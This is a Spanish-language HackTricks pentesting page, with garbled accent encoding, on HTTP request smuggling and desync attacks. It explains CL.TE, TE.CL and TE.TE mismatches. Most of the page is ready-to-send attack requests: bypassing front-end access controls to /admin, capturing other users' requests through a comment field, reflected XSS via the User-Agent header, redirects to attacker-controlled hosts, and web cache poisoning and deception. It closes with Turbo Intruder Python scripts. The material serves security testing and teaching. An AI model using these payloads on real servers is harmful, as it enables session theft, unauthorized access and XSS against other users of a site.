# Ataque de Desincronizaci√≥n de Petici√≥n HTTP / Ataque de Desincronizaci√≥n HTTP

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Qu√© es

Esta vulnerabilidad ocurre cuando una **desincronizaci√≥n** entre los **proxies de front-end** y el **servidor de back-end** permite a un **atacante** enviar una **petici√≥n HTTP** que ser√° **interpretada** como una **√∫nica petici√≥n** por los **proxies de front-end** (balanceador de carga/proxy inverso) y **como 2 peticiones** por el **servidor de back-end**.\
Esto permite a un usuario **modificar la siguiente petici√≥n que llega al servidor de back-end despu√©s de la suya**.

### Teor√≠a

[Especificaci√≥n RFC (2161)](https://tools.ietf.org/html/rfc2616)

> Si se recibe un mensaje con un campo de encabezado Transfer-Encoding y un campo de encabezado Content-Length, este √∫ltimo DEBE ser ignorado.

**Content-Length**

> El encabezado de entidad Content-Length indica el tama√±o del cuerpo de la entidad, en bytes, enviado al destinatario.

**Transfer-Encoding: chunked**

> El encabezado Transfer-Encoding especifica la forma de codificaci√≥n utilizada para transferir de manera segura el cuerpo de carga √∫til al usuario.\
> Chunked significa que los datos grandes se env√≠an en una serie de fragmentos.

### Realidad

El **Front-End** (un balanceador de carga / Proxy Inverso) **procesa** el encabezado _**content-length**_ o el _**transfer-encoding**_ y el **servidor de Back-End** **procesa el otro** provocando una **desincronizaci√≥n** entre los 2 sistemas.\
Esto podr√≠a ser muy cr√≠tico ya que **un atacante podr√° enviar una petici√≥n** al proxy inverso que ser√° **interpretada** por el **servidor de back-end como 2 peticiones diferentes**. El **peligro** de esta t√©cnica radica en el hecho de que el **servidor de back-end interpretar√° la 2da petici√≥n inyectada** como si **hubiera venido del siguiente cliente** y la **petici√≥n real** de ese cliente ser√° **parte** de la **petici√≥n inyectada**.

### Particularidades

Recuerda que en HTTP **un car√°cter de nueva l√≠nea est√° compuesto por 2 bytes:**

* **Content-Length**: Este encabezado utiliza un **n√∫mero decimal** para indicar el **n√∫mero** de **bytes** del **cuerpo** de la petici√≥n. Se espera que el cuerpo termine en el √∫ltimo car√°cter, **no se necesita una nueva l√≠nea al final de la petici√≥n**.
* **Transfer-Encoding:** Este encabezado utiliza en el **cuerpo** un **n√∫mero hexadecimal** para indicar el **n√∫mero** de **bytes** del **pr√≥ximo fragmento**. El **fragmento** debe **terminar** con una **nueva l√≠nea** pero esta nueva l√≠nea **no se cuenta** en el indicador de longitud. Este m√©todo de transferencia debe terminar con un **fragmento de tama√±o 0 seguido de 2 nuevas l√≠neas**: `0`
* **Connection**: Basado en mi experiencia, se recomienda usar **`Connection: keep-alive`** en la primera petici√≥n del ataque de Smuggling de petici√≥n.

## Ejemplos B√°sicos

Los ataques de desincronizaci√≥n de petici√≥n HTTP se crean enviando peticiones ambiguas que explotan discrepancias en c√≥mo los servidores de front-end y back-end interpretan los encabezados `Content-Length` (CL) y `Transfer-Encoding` (TE). Estos ataques pueden manifestarse en diferentes formas, principalmente como **CL.TE**, **TE.CL**, y **TE.TE**. Cada tipo representa una combinaci√≥n √∫nica de c√≥mo los servidores de front-end y back-end priorizan estos encabezados. Las vulnerabilidades surgen de los servidores procesando la misma petici√≥n de diferentes maneras, lo que lleva a resultados inesperados y potencialmente maliciosos.

### Ejemplos B√°sicos de Tipos de Vulnerabilidad

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### Vulnerabilidad CL.TE (Content-Length usado por Front-End, Transfer-Encoding usado por Back-End)
- **Front-End (CL):** Procesa la petici√≥n bas√°ndose en el encabezado `Content-Length`.
- **Back-End (TE):** Procesa la petici√≥n bas√°ndose en el encabezado `Transfer-Encoding`.
- **Escenario de Ataque:**
- El atacante env√≠a una petici√≥n donde el valor del encabezado `Content-Length` no coincide con la longitud real del contenido.
- El servidor de front-end reenv√≠a toda la petici√≥n al back-end, bas√°ndose en el valor de `Content-Length`.
- El servidor de back-end procesa la petici√≥n como fragmentada debido al encabezado `Transfer-Encoding: chunked`, interpretando los datos restantes como una petici√≥n separada y subsiguiente.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Vulnerabilidad TE.CL (Transfer-Encoding usado por Front-End, Content-Length usado por Back-End)
- **Front-End (TE):** Procesa la petici√≥n bas√°ndose en el encabezado `Transfer-Encoding`.
- **Back-End (CL):** Procesa la petici√≥n bas√°ndose en el encabezado `Content-Length`.
- **Escenario de Ataque:**
- El atacante env√≠a una petici√≥n fragmentada donde el tama√±o del fragmento (`7b`) y la longitud real del contenido (`Content-Length: 4`) no coinciden.
- El servidor de front-end, respetando `Transfer-Encoding`, reenv√≠a toda la petici√≥n al back-end.
- El servidor de back-end, respetando `Content-Length`, procesa solo la parte inicial de la petici√≥n (`7b` bytes), dejando el resto como parte de una petici√≥n subsiguiente no intencionada.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### Vulnerabilidad TE.TE (Transfer-Encoding usado por ambos, con obfuscaci√≥n)
- **Servidores:** Ambos admiten `Transfer-Encoding`, pero uno puede ser enga√±ado para ignorarlo mediante obfuscaci√≥n.
- **Escenario de Ataque:**
- El atacante env√≠a una petici√≥n con encabezados de `Transfer-Encoding` obfuscados.
- Dependiendo de qu√© servidor (front-end o back-end) no reconozca la obfuscaci√≥n, se puede explotar una vulnerabilidad CL.TE o TE.CL.
- La parte no procesada de la petici√≥n, vista por uno de los servidores, se convierte en parte de una petici√≥n subsiguiente, lo que lleva al smuggling.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Escenario CL.CL (Content-Length usado por ambos Front-End y Back-End):**
- Ambos servidores procesan la petici√≥n bas√°ndose √∫nicamente en el encabezado `Content-Length`.
- Este escenario t√≠picamente no conduce al smuggling, ya que hay alineaci√≥n en c√≥mo ambos servidores interpretan la longitud de la petici√≥n.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Petici√≥n Normal
```

#### **Escenario CL != 0:**
- Se refiere a escenarios donde el encabezado `Content-Length` est√° presente y tiene un valor distinto de cero, indicando que el cuerpo de la petici√≥n tiene contenido.
- Es crucial para comprender y crear ataques de smuggling, ya que influye en c√≥mo los servidores determinan el final de una petici√≥n.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Cuerpo no vac√≠o
```

#### Forzando a trav√©s de encabezados hop-by-hop

Abusando de los encabezados hop-by-hop, podr√≠as indicar al proxy que **elimine el encabezado Content-Length o Transfer-Encoding para que sea posible abusar de un ataque de smuggling de petici√≥n HTTP**.
```
Connection: Content-Length
```
Para **m√°s informaci√≥n sobre encabezados de paso a paso**, visita:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## Encontrar HTTP Request Smuggling

Identificar vulnerabilidades de HTTP request smuggling a menudo se puede lograr utilizando t√©cnicas de temporizaci√≥n, que dependen de observar cu√°nto tiempo tarda el servidor en responder a las solicitudes manipuladas. Estas t√©cnicas son particularmente √∫tiles para detectar vulnerabilidades CL.TE y TE.CL. Adem√°s de estos m√©todos, existen otras estrategias y herramientas que se pueden utilizar para encontrar tales vulnerabilidades:

### Encontrar Vulnerabilidades CL.TE Utilizando T√©cnicas de Temporizaci√≥n
- **M√©todo:**
- Enviar una solicitud que, si la aplicaci√≥n es vulnerable, har√° que el servidor de back-end espere datos adicionales.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **Observaci√≥n:**
- El servidor de front-end procesa la solicitud bas√°ndose en `Content-Length` y corta el mensaje prematuramente.
- El servidor de back-end, esperando un mensaje fragmentado, espera el siguiente fragmento que nunca llega, causando un retraso.

- **Indicadores:**
- Tiempos de espera o largos retrasos en la respuesta.
- Recibir un error 400 Bad Request del servidor de back-end, a veces con informaci√≥n detallada del servidor.

### Encontrar Vulnerabilidades TE.CL Utilizando T√©cnicas de Temporizaci√≥n
- **M√©todo:**
- Enviar una solicitud que, si la aplicaci√≥n es vulnerable, har√° que el servidor de back-end espere datos adicionales.
- **Ejemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **Observaci√≥n:**
- El servidor de front-end procesa la solicitud bas√°ndose en `Transfer-Encoding` y reenv√≠a el mensaje completo.
- El servidor de back-end, esperando un mensaje basado en `Content-Length`, espera datos adicionales que nunca llegan, causando un retraso.

### Otros M√©todos para Encontrar Vulnerabilidades
- **An√°lisis Diferencial de Respuestas:**
- Enviar versiones ligeramente variadas de una solicitud y observar si las respuestas del servidor difieren de manera inesperada, lo que indica una discrepancia en el an√°lisis.

- **Uso de Herramientas Automatizadas:**
- Herramientas como la extensi√≥n 'HTTP Request Smuggler' de Burp Suite pueden probar autom√°ticamente estas vulnerabilidades enviando diversas formas de solicitudes ambiguas y analizando las respuestas.

- **Pruebas de Variaci√≥n de Content-Length:**
- Enviar solicitudes con valores de `Content-Length` variables que no coincidan con la longitud real del contenido y observar c√≥mo el servidor maneja tales discrepancias.

- **Pruebas de Variaci√≥n de Transfer-Encoding:**
- Enviar solicitudes con encabezados de `Transfer-Encoding` obfuscados o malformados y monitorear c√≥mo responden de manera diferente los servidores de front-end y back-end a tales manipulaciones.


### Pruebas de Vulnerabilidad de HTTP Request Smuggling

Despu√©s de confirmar la efectividad de las t√©cnicas de temporizaci√≥n, es crucial verificar si las solicitudes de los clientes pueden ser manipuladas. Un m√©todo sencillo es intentar envenenar tus solicitudes, por ejemplo, haciendo que una solicitud a `/` genere una respuesta 404. Los ejemplos de `CL.TE` y `TE.CL` discutidos anteriormente en [Ejemplos B√°sicos](./#basic-examples) muestran c√≥mo envenenar la solicitud de un cliente para provocar una respuesta 404, a pesar de que el cliente intenta acceder a un recurso diferente.

**Consideraciones Clave**

Al probar vulnerabilidades de request smuggling al interferir con otras solicitudes, ten en cuenta:

* **Conexiones de Red Distintas:** Las solicitudes "de ataque" y "normales" deben enviarse a trav√©s de conexiones de red separadas. Utilizar la misma conexi√≥n para ambas no valida la presencia de la vulnerabilidad.
* **URL y Par√°metros Consistentes:** Intenta utilizar URLs id√©nticas y nombres de par√°metros para ambas solicitudes. Las aplicaciones modernas a menudo dirigen las solicitudes a servidores de back-end espec√≠ficos seg√∫n la URL y los par√°metros. Coincidir con estos aumenta la probabilidad de que ambas solicitudes sean procesadas por el mismo servidor, un requisito previo para un ataque exitoso.
* **Temporizaci√≥n y Condiciones de Carrera:** La solicitud "normal", destinada a detectar la interferencia de la solicitud "de ataque", compite contra otras solicitudes de la aplicaci√≥n concurrentes. Por lo tanto, env√≠a la solicitud "normal" inmediatamente despu√©s de la solicitud "de ataque". Las aplicaciones ocupadas pueden requerir m√∫ltiples pruebas para confirmar la vulnerabilidad de manera concluyente.
* **Desaf√≠os de Balanceo de Carga:** Los servidores de front-end que act√∫an como balanceadores de carga pueden distribuir las solicitudes en varios sistemas de back-end. Si las solicitudes "de ataque" y "normales" terminan en sistemas diferentes, el ataque no tendr√° √©xito. Este aspecto del balanceo de carga puede requerir varios intentos para confirmar una vulnerabilidad.
* **Impacto no Intencionado en el Usuario:** Si tu ataque afecta inadvertidamente la solicitud de otro usuario (no la solicitud "normal" que enviaste para la detecci√≥n), esto indica que tu ataque influy√≥ en otro usuario de la aplicaci√≥n. Las pruebas continuas podr√≠an interrumpir a otros usuarios, lo que requiere un enfoque cauteloso.


## Abusando de HTTP Request Smuggling

### Para evadir controles de seguridad de front-end

### Circunvalando la Seguridad de Front-End a trav√©s de HTTP Request Smuggling

A veces, los proxies de front-end imponen medidas de seguridad, escrutando las solicitudes entrantes. Sin embargo, estas medidas pueden ser eludidas explotando HTTP Request Smuggling, permitiendo el acceso no autorizado a puntos finales restringidos. Por ejemplo, acceder a `/admin` podr√≠a estar prohibido externamente, con el proxy de front-end bloqueando activamente tales intentos. No obstante, este proxy puede omitir inspeccionar las solicitudes incrustadas dentro de una solicitud HTTP contrabandeada, dejando una brecha para eludir estas restricciones.

Considera los siguientes ejemplos que ilustran c√≥mo HTTP Request Smuggling puede ser utilizado para evadir controles de seguridad de front-end, apuntando espec√≠ficamente al camino `/admin` que t√≠picamente est√° protegido por el proxy de front-end:

**Ejemplo CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
En el ataque CL.TE, se aprovecha el encabezado `Content-Length` para la solicitud inicial, mientras que la solicitud incrustada posterior utiliza el encabezado `Transfer-Encoding: chunked`. El proxy de front-end procesa la solicitud `POST` inicial pero no inspecciona la solicitud incrustada `GET /admin`, lo que permite el acceso no autorizado al camino `/admin`.

**Ejemplo TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Por el contrario, en el ataque TE.CL, la solicitud `POST` inicial utiliza `Transfer-Encoding: chunked`, y la solicitud incrustada posterior se procesa en funci√≥n del encabezado `Content-Length`. Similar al ataque CL.TE, el proxy de front-end pasa por alto la solicitud `GET /admin` infiltrada, otorgando inadvertidamente acceso al camino restringido `/admin`.

### Revelando la reescritura de solicitudes de front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Las aplicaciones a menudo emplean un **servidor de front-end** para modificar las solicitudes entrantes antes de enviarlas al servidor de back-end. Una modificaci√≥n t√≠pica implica agregar encabezados, como `X-Forwarded-For: <IP del cliente>`, para transmitir la IP del cliente al back-end. Comprender estas modificaciones puede ser crucial, ya que podr√≠a revelar formas de **burlar protecciones** o **descubrir informaci√≥n o puntos finales ocultos**.

Para investigar c√≥mo un proxy altera una solicitud, localiza un par√°metro POST que el back-end ecoea en la respuesta. Luego, crea una solicitud, utilizando este par√°metro al final, similar a lo siguiente:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
En esta estructura, los componentes de la solicitud posterior se agregan despu√©s de `search=`, que es el par√°metro reflejado en la respuesta. Esta reflexi√≥n expondr√° los encabezados de la solicitud posterior.

Es importante alinear el encabezado `Content-Length` de la solicitud anidada con la longitud real del contenido. Comenzar con un valor peque√±o e incrementar gradualmente es recomendable, ya que un valor demasiado bajo truncar√° los datos reflejados, mientras que un valor demasiado alto puede hacer que la solicitud genere un error.

Esta t√©cnica tambi√©n es aplicable en el contexto de una vulnerabilidad TE.CL, pero la solicitud debe terminar con `search=\r\n0`. Independientemente de los caracteres de nueva l√≠nea, los valores se agregar√°n al par√°metro de b√∫squeda.

Este m√©todo sirve principalmente para comprender las modificaciones de la solicitud realizadas por el proxy de front-end, realizando esencialmente una investigaci√≥n autodirigida.

### Capturando las solicitudes de otros usuarios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Es factible capturar las solicitudes del siguiente usuario agregando una solicitud espec√≠fica como el valor de un par√°metro durante una operaci√≥n POST. As√≠ es como se puede lograr:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
En este escenario, el **par√°metro de comentario** est√° destinado a almacenar el contenido dentro de la secci√≥n de comentarios de una publicaci√≥n en una p√°gina de acceso p√∫blico. En consecuencia, el contenido de la solicitud posterior aparecer√° como un comentario.

Sin embargo, esta t√©cnica tiene limitaciones. Generalmente, captura datos solo hasta el delimitador de par√°metros utilizado en la solicitud contrabandeada. Para env√≠os de formularios codificados en URL, este delimitador es el car√°cter `&`. Esto significa que el contenido capturado de la solicitud del usuario v√≠ctima se detendr√° en el primer `&`, que incluso puede ser parte de la cadena de consulta.

Adem√°s, vale la pena se√±alar que este enfoque tambi√©n es viable con una vulnerabilidad TE.CL. En tales casos, la solicitud debe concluir con `search=\r\n0`. Independientemente de los caracteres de nueva l√≠nea, los valores se agregar√°n al par√°metro de b√∫squeda.

### Utilizando el contrabando de solicitudes HTTP para explotar XSS reflejado

El contrabando de solicitudes HTTP se puede aprovechar para explotar p√°ginas web vulnerables a **XSS Reflejado**, ofreciendo ventajas significativas:

* No se requiere **interacci√≥n** con los usuarios objetivo.
* Permite la explotaci√≥n de XSS en partes de la solicitud que son **normalmente inaccesibles**, como los encabezados de solicitud HTTP.

En escenarios donde un sitio web es susceptible a XSS Reflejado a trav√©s del encabezado User-Agent, la siguiente carga √∫til demuestra c√≥mo explotar esta vulnerabilidad:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Este payload est√° estructurado para explotar la vulnerabilidad mediante:

1. Iniciar una solicitud `POST`, aparentemente t√≠pica, con un encabezado `Transfer-Encoding: chunked` para indicar el inicio del contrabando.
2. Seguir con un `0`, marcando el final del cuerpo del mensaje en bloques.
3. Luego, se introduce una solicitud `GET` contrabandeada, donde el encabezado `User-Agent` se inyecta con un script, `<script>alert(1)</script>`, desencadenando el XSS cuando el servidor procesa esta solicitud subsecuente.

Al manipular el `User-Agent` a trav√©s del contrabando, el payload evade las restricciones normales de la solicitud, explotando as√≠ la vulnerabilidad de XSS Reflejado de una manera no est√°ndar pero efectiva.

### Usando el contrabando de solicitudes HTTP para convertir una redirecci√≥n en el sitio en una redirecci√≥n abierta <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Explotando Redirecciones en el Sitio con el Contrabando de Solicitudes HTTP <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Las aplicaciones a menudo redirigen de una URL a otra utilizando el nombre de host del encabezado `Host` en la URL de redirecci√≥n. Esto es com√∫n en servidores web como Apache e IIS. Por ejemplo, solicitar una carpeta sin una barra diagonal al final resulta en una redirecci√≥n para incluir la barra:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Resultados en:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Aunque parezca inofensivo, este comportamiento puede ser manipulado utilizando el contrabando de solicitudes HTTP para redirigir a los usuarios a un sitio externo. Por ejemplo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Esta solicitud contrabandeada podr√≠a hacer que la siguiente solicitud de usuario procesada sea redirigida a un sitio web controlado por un atacante:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Resultados en:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### Utilizando el contrabando de solicitudes HTTP para realizar envenenamiento de cach√© web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### Explotando el Envenenamiento de Cach√© Web a trav√©s del Contrabando de Solicitudes HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

El envenenamiento de cach√© web se puede ejecutar si alg√∫n componente de la **infraestructura del front-end almacena en cach√© contenido**, t√≠picamente para mejorar el rendimiento. Al manipular la respuesta del servidor, es posible **envenenar la cach√©**.

Anteriormente, observamos c√≥mo las respuestas del servidor pod√≠an ser alteradas para devolver un error 404 (consulte [Ejemplos B√°sicos](./#basic-examples)). De manera similar, es factible enga√±ar al servidor para que entregue el contenido de `/index.html` en respuesta a una solicitud de `/static/include.js`. En consecuencia, el contenido de `/static/include.js` se reemplaza en la cach√© por el de `/index.html`, haciendo que `/static/include.js` sea inaccesible para los usuarios, lo que potencialmente podr√≠a llevar a una Denegaci√≥n de Servicio (DoS).

Esta t√©cnica se vuelve particularmente potente si se descubre una **vulnerabilidad de Redirecci√≥n Abierta** o si hay una **redirecci√≥n en el sitio a una redirecci√≥n abierta**. Estas vulnerabilidades pueden ser explotadas para reemplazar el contenido en cach√© de `/static/include.js` con un script bajo el control del atacante, lo que b√°sicamente habilita un ataque generalizado de Cross-Site Scripting (XSS) contra todos los clientes que soliciten el `/static/include.js` actualizado.

A continuaci√≥n se muestra una ilustraci√≥n de la explotaci√≥n del **envenenamiento de cach√© combinado con una redirecci√≥n en el sitio a una redirecci√≥n abierta**. El objetivo es alterar el contenido en cach√© de `/static/include.js` para servir c√≥digo JavaScript controlado por el atacante:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Ten en cuenta la solicitud incrustada dirigida a `/post/next?postId=3`. Esta solicitud ser√° redirigida a `/post?postId=4`, utilizando el valor del **encabezado Host** para determinar el dominio. Al alterar el **encabezado Host**, el atacante puede redirigir la solicitud a su dominio (**redirecci√≥n interna a redirecci√≥n abierta**).

Despu√©s de un exitoso **envenenamiento de socket**, se debe iniciar una solicitud **GET** para `/static/include.js`. Esta solicitud ser√° contaminada por la solicitud previa de **redirecci√≥n interna a redirecci√≥n abierta** y obtendr√° el contenido del script controlado por el atacante.

Posteriormente, cualquier solicitud para `/static/include.js` servir√° el contenido en cach√© del script del atacante, lanzando efectivamente un amplio ataque XSS.


### Uso del contrabando de solicitudes HTTP para realizar enga√±o de cach√© web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **¬øCu√°l es la diferencia entre el envenenamiento de cach√© web y el enga√±o de cach√© web?**
>
> * En el **envenenamiento de cach√© web**, el atacante hace que la aplicaci√≥n almacene alg√∫n contenido malicioso en la cach√©, y este contenido se sirve desde la cach√© a otros usuarios de la aplicaci√≥n.
> * En el **enga√±o de cach√© web**, el atacante hace que la aplicaci√≥n almacene alg√∫n contenido sensible perteneciente a otro usuario en la cach√©, y luego el atacante recupera este contenido de la cach√©.

El atacante crea una solicitud contrabandeada que obtiene contenido sensible espec√≠fico del usuario. Considera el siguiente ejemplo:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Si esta solicitud contrabandeada envenena una entrada de cach√© destinada para contenido est√°tico (por ejemplo, `/someimage.png`), los datos sensibles de la v√≠ctima de `/private/messages` podr√≠an ser almacenados en la entrada de cach√© del contenido est√°tico. En consecuencia, el atacante podr√≠a potencialmente recuperar estos datos sensibles almacenados en cach√©.

### Armando HTTP Request Smuggling con Desincronizaci√≥n de Respuesta HTTP

¬øHas encontrado alguna vulnerabilidad de HTTP Request Smuggling y no sabes c√≥mo explotarla? Prueba este otro m√©todo de explotaci√≥n:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts de Turbo Intruder

### CL.TE

Desde [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Desde: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Herramientas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta herramienta es un Fuzzer HTTP basado en gram√°tica √∫til para encontrar discrepancias extra√±as en el tr√°fico de solicitudes.

## Referencias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

